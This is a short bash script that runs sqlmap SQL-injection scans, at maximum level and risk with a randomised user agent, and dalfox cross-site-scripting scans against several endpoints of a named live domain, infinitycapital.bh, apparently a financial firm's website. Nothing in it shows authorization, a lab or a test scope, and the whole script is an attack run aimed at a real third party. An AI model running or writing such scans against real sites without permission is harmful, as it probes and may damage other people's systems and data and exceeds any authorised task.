#!/bin/bash
cd /work 2>/dev/null || cd "$WORK_PATH"
W=${WORK_PATH:-/work}
U="https://www.infinitycapital.bh"
IMG='https%3A%2F%2Fimages.ctfassets.net%2Fyts1dx0j7jj5%2Fx.jpg'
echo "=== SQLMAP /_next/image (url,w,q) ==="
timeout 300 sqlmap -u "$U/_next/image?url=$IMG&w=128&q=75" -p "url,w,q" --batch --level=5 --risk=3 --technique=BEUST --timeout=10 --retries=0 --random-agent 2>&1 | tail -22
echo "=== SQLMAP /404?id ==="
timeout 200 sqlmap -u "$U/404?id=1" --batch --level=3 --risk=2 --technique=BEUST --timeout=10 --retries=0 2>&1 | tail -12
echo "=== SQLMAP POST /api/ body ==="
timeout 200 sqlmap -u "$U/api/" --batch --level=3 --risk=2 --technique=BEUST --timeout=10 --retries=0 --data="id=1&name=test&q=test" 2>&1 | tail -12
echo "=== DALFOX /_next/image ==="
timeout 180 dalfox url "$U/_next/image?url=$IMG&w=128&q=75" --silence --no-color 2>&1 | tail -20
echo "=== DALFOX /api/ ==="
timeout 180 dalfox url "$U/api/?id=1&q=test" --silence --no-color 2>&1 | tail -15
echo "=== DALFOX /404 ==="
timeout 120 dalfox url "$U/404?id=1" --silence --no-color 2>&1 | tail -10
echo "DONE"
